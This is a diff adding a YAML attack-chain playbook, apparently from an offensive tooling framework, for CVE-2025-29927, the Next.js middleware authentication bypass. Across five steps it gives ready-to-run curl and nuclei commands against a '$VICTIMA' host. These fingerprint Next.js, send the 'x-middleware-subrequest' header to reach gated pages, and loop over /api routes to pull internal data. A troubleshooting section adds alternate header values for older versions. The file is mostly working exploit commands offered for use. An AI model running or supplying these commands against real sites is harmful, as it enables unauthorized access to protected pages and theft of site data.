@@ -1,0 +1,65 @@
+chain_id: nextjs_middleware_cve_2025_29927
+title: "Next.js — CVE-2025-29927 middleware auth bypass via x-middleware-subrequest"
+severity: CRITICAL
+tags: [web, nextjs, vercel, cve-2025-29927, auth-bypass]
+
+trigger:
+  any_of:
+    - { kind: "CVE-2025-29927" }
+    - { banner_pattern: "(?i)next\\.?js|x-powered-by:\\s*next" }
+    - { product_pattern: "(?i)next\\.?js" }
+
+description: |
+  Next.js < 12.3.5 / 13.5.9 / 14.2.25 / 15.2.3 honors the request
+  header `x-middleware-subrequest: middleware:middleware:middleware:
+  middleware:middleware` to mark a request as already-handled by
+  middleware, skipping it entirely. Any authentication, authorization,
+  or rewrite check implemented in `middleware.ts` is bypassed in one
+  HTTP header. Discovered Mar 2025, mass-scanned within hours.
+
+steps:
+  - id: 1
+    title: "Fingerprint Next.js"
+    command: |
+      curl -sk -I "https://$VICTIMA/" | grep -i 'next\\|x-powered-by'
+      curl -sk "https://$VICTIMA/_next/static/" -I
+
+  - id: 2
+    title: "Confirm middleware exists (look for /admin or /dashboard 302→login)"
+    command: |
+      curl -sk -i "https://$VICTIMA/admin"
+      # Expect 302 / 401 → there's a middleware gate.
+
+  - id: 3
+    title: "Bypass — same path with the magic header"
+    command: |
+      curl -sk -i "https://$VICTIMA/admin" \
+        -H 'x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware'
+      # Expect 200 with the gated page.
+
+  - id: 4
+    title: "Programmatic — dump every gated route on the host"
+    command: |
+      git clone https://github.com/projectdiscovery/nuclei-templates /tmp/nt
+      nuclei -u https://$VICTIMA -t /tmp/nt/http/cves/2025/CVE-2025-29927.yaml
+
+  - id: 5
+    title: "Post — many Next.js apps stash secrets in /api routes"
+    command: |
+      for p in /api/users /api/admin /api/internal /api/config; do
+        curl -sk -H 'x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware' \
+          "https://$VICTIMA$p" -i | head
+      done
+
+common_errors:
+  - error: "Header has no effect — still 302"
+    solution: |
+      Older Next.js (< 12.2) used a different sentinel string. Try
+      `middleware:middleware` (one repetition) or
+      `src/middleware:src/middleware:src/middleware:src/middleware:src/middleware`
+      depending on project layout. The header value must repeat the
+      handler path 5x.
+
+references:
+  - https://nvd.nist.gov/vuln/detail/CVE-2025-29927
+  - https://nextjs.org/blog/cve-2025-29927
